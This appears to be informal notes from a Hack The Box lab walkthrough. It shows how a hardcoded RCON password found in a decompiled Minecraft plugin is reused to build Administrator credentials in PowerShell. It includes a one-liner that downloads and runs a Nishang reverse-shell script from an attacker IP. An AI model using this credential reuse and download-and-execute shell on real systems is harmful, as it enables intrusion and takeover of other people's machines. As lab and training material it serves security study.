# powershell
- simple modified powershell can be used to gain access from one user to another using but it needs what is know as password

assume we have managed to get a shell and we have meet something like this maybe 
```
public final class Playercounter extends JavaPlugin {  
  public void onEnable() {  
    Rcon rcon = null;  
    try {  
      rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());  
    } catch (IOException e) {  
      throw new RuntimeException(e);  
    } catch (AuthenticationException e2) {  
      throw new RuntimeException(e2);


This issue can be referenced from a craft machine from hack the box
```

- If we try to discete the code we can see that is trying to create a playercounter plugin with a onEnable() method being enabled, with the method we can see the the is a Rcon class which tried to establish remote connection with the above port,ip and password as "s67u84zKq8IXw". first it will try to connect and if the authentication fails it throws an exceptions error and it will stop loading the plugin

- now lets see how we can abuse this into getting a shell as an adminstrator, first we will need the following credential object based parameter

# Create string  that will store our password

we need to create an object based paramater that will carry our credentials lets begin with a string to hold the creds

```
PS C:\Users\svc_minecraft\server\plugins> $SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force  

we can try to make a secure password conversion 
```

# After we have store our password lets create a new object named creds that will hold this creds with a respective administrator username
```
PS C:\Users\svc_minecraft\server\plugins> $cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)  

```

# after that the last part will be using this object to get a shell
```
PS C:\Users\svc_minecraft\server\plugins> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.79:8080/a.ps1')" -Credential $cred
```
what we have done so above is that we  have initilize the process that will execute the download a powershell script from our machine and execute it and we get a reverse shell


N/B: This powershell script is from nishang but also you can get it from here


